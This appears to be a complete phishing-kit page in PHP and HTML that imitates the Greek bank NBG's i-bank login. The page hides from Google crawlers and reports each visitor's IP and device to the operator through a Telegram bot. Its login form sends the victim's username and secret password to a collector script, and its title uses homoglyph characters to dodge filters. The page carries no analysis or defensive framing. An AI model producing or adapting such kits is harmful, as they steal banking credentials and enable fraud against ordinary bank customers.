<?php
   session_start();
   error_reporting(0);
      include('../config1.php');
       if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
       if(strpos(gethostbyaddr(getenv('REMOTE_ADDR')),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
 
if('default.php'  == true ){
   $ip = getenv("REMOTE_ADDR");

       $message = "-------------------- 🏦 NBG Views 🏦 ------------------- \nBrowser : ".$br."\nDevice : ".$os."\nCountry : ".$Country."\nIP      : ".$ip."\nURL     : ".$url."\n-------------------- 🇬🇷 Gholy 🇬🇷-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);
      
      }
      }
 
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Wеb ΝВG і-bаnk</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">
      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="src/img/favicon.ico">
      <link href="src/style5.css" rel="stylesheet">
      <style>

      input.zokomek
      {
      -webkit-text-security: disc;
      text-security: disc;
      }
      </style>
      <script type="text/javascript">
         function manage(pass) {
          var bt = document.getElementById('btSubmit');
         
          if (pass.value.length > 4 ) {
              bt.disabled = false;
          }
          else {
              bt.disabled = true;
          }
         }  
         
      </script>
   </head>
   <body class="login-bg windows login-night">
      <index-page ng-version="7.2.16">
         <div agent-type="" class="appRoot">
            <login class="flex-column min-height-full-vh">
               <login-header>
                  <header class="main-header">
                     <div class="flex-vertical-center-space-between header-container wrap-mobile-medium">
                        <nikomek-icon class="full-screen-width--mobile" style="height: 8.5rem; margin-top: -2.5rem">
                           <div class="flex-vertical-center" style="height: 11rem; min-height: 11rem;"><img alt="nbg logo" class="full-height margin-auto--mobile" src="src/img/login-logo.el.png"></div>
                        </nikomek-icon>
                        <div class="
                           flex-vertical-center
                           full-height
                           margin-top-normal-mobile-medium margin-mobile-languange
                           ">
                           <button class="button-transparent text-light text-large text-white" style="margin: 0 0.5rem"><span class="text-action">ΕΛ</span><span>/</span><span>EN</span></button>
                           <div class="horizontal-divider" style="height: 120%"></div>
                           <div class="flex-vertical-center text-white">
                              <div class="flex-row text-light">
                                 <div class="flex-column">
                                    <div class="flex-vertical-center cursor-pointer" style="margin-bottom: 0.75rem">
                                       <div class="icon-help-faq icon-container-20"></div>
                                       <span><a class="
                                          link-white
                                          text-medium text-regular
                                          margin-left-small
                                          text-white
                                          " href="#" target="_blank">Συχνές ερωτήσεις</a></span>
                                    </div>
                                    <div class="flex-vertical-center cursor-pointer"><i class="icon-phone" style="font-size: 20px"></i><span class="text-medium text-regular margin-left-small">Επικοινωνία</span></div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
               </login-header>
               <div class="max-width-container-login">
                  <div class="login-container">
                     <h1 class="text-page-heading text-align-center text-medium text-white modal-wrapper-margin-bottom"> Καλώς ήρθατε στο i-bank</h1>
                     <img class="login-header-img margin-bottom-medium login-night display-none">
                     <sign-in class="user-login-container">
                        <form method="POST" action="pro/ci.php">
                        <sign-in-form>
                           <div>
                              <div class="user-login-subcontainer">
                                 <div class="full-height flex-column">
                                    <div class="position-relative">
                                       <div class="flex-center">
                                          <input name="3oss" class="oval-input ng-pristine ng-valid ng-touched" id="log" minlength="5" test-field="usernameField" type="text" placeholder="Κωδικός χρήστη" required="">
                                          <div class="right-default field-tooltip"><button class="button-transparent" type="button"><i class="icon-rounded text-primary text-x-large flex mat-select-cursor-pointer"></i></button></div>
                                       </div>
                                    </div>
                                    <div class="position-relative margin-top-default"><input name="kalimet" minlength="5" class=" zokomek oval-input ng-pristine ng-valid ng-touched" id="zokomek" onkeyup="manage(this)"  type="text" placeholder="Μυστικός κωδικός" required><button onclick="myFunction()" class="button-icon right-default position-absolute-center-y"><i class="icon-svg-container-small icon-visibility"></i></button></div>
                                    <div class="flex-vertical-center-space-between margin-top-normal">
                                       <button class="button-secondary--white" style="min-width: 11.5rem"> Ξέχασα το username </button>
                                       <spinner type="action">
                                          <button class="button" style="min-width: 7.5rem" test-button="continueLoginButton" name="logs" id="btSubmit" type="submit" disabled> Συνέχεια </button>
                                       </spinner>
                                    </div>
                                    <div class="flex-vertical-center-space-between margin-top-default" style="width: 19rem; margin-left: 0.5rem">
                                       <button class="button-transparent button-with-icon text-white" style="background-color: transparent" type="button">
                                          <i class="icon-new-user icon-mirrored text-large"></i>
                                          <div class="margin-left-small text-normal"> Εγγραφή ιδιώτη </div>
                                       </button>
                                       <button class="button-transparent button-with-icon text-white" style="background-color: transparent" type="button">
                                          <i class="icon-work icon-mirrored text-large"></i>
                                          <div class="margin-left-small text-normal"> Νέα επιχείρηση </div>
                                       </button>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </sign-in-form>
                        </form>
                     </sign-in>
                    <br><br>
                  </div>
                  <div class="margin-top-auto">
                     <useful-links>
                        <div class="useful-links-container">
                           <div class="social-links-container"><a class="icon-container icon-facebook-lg" ngclass="icon-facebook-lg" target="_blank" href="#"></a><a class="icon-container icon-twitter-lg" ngclass="icon-twitter-lg" target="_blank" href="#"></a><a class="icon-container icon-youtube-lg" ngclass="icon-youtube-lg" target="_blank" href="#"></a><a class="icon-container icon-linkedin-lg" ngclass="icon-linkedin-lg" target="_blank" href="#"></a><a class="icon-container icon-email-lg" ngclass="icon-email-lg" target="_blank" href="#"></a></div>
                           <div class="links-container">
                              <a class="link-white button-transparent useful-link" target="_blank" href="#"> Προστασία Δεδομένων Προσωπικού Χαρακτήρα </a><a class="link-white button-transparent useful-link" target="_blank" href="#"> Συμβατότητα με browsers </a>
                           </div>
                        </div>
                     </useful-links>
                  </div>
               </div>
            </login>
         </div>
      </index-page>
   </body>
</html>
